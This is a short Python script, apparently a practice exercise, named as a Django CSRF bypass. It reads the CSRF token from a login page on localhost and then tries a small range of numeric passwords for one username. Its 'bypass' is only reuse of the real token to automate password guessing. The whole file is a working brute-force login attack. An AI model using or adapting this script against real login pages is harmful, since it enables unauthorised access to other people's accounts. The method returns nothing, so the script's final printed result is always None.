import requests, time


class ByPassCSRFDjango():

    def bypass(self, url):
        client = requests.session()
        client.get(url)
        csrftoken = client.cookies['csrftoken']
        
        for senhas_numericas in range(18,24):

            login_data = {'username': "2",
                          'password': senhas_numericas,
                          'csrfmiddlewaretoken': csrftoken,
                           'login': 'submit'}
            http =client.post(url, data=login_data)
            print(http.text)
            time.sleep(2)





result = ByPassCSRFDjango().bypass("http://localhost:8000/login/")
print(result)
